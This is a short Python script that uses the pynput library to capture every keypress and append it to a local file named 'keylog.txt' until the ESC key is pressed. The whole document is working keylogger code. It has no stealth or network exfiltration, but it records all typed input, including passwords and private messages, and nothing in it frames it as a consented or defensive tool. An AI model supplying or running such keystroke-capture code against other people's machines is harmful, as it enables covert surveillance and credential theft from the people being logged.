from pynput import keyboard

# Log file to store the keystrokes
log_file = "keylog.txt"

# Function to log the keypress
def on_press(key):
    try:
        # For regular keys (letters, numbers)
        with open(log_file, 'a') as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # For special keys (e.g., Shift, Space, Enter)
        with open(log_file, 'a') as f:
            f.write(f"{str(key)}\n")

# Function to stop the listener (e.g., on pressing the ESC key)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the ESC key is pressed
        return False

# Start the listener to capture keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
